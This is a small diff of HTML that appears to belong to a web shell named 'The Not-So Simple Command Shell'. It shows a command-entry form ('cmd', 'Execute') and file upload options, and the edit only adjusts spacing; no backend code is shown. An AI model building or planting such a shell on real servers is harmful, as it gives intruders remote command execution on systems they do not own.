@@ -30,7 +30,7 @@
         <div style="border:1px solid #333;width:50%;padding:0px 30px;border-radius:10px;margin:10px 40px;">
         <p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
         <form action="" method="get">Command? <input type="text" name="cmd" autofocus/>
-        <button type="submit">Execute</button>&nbsp;&nbsp;&nbsp;<a href="?links=1">&nbsp;QuickLinks</a></form><br>
+        <button type="submit">Execute</button>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?links=1">QuickLinks</a></form><br>
         File Options<br>
         <form action="" method="get">
         <select name="upload">
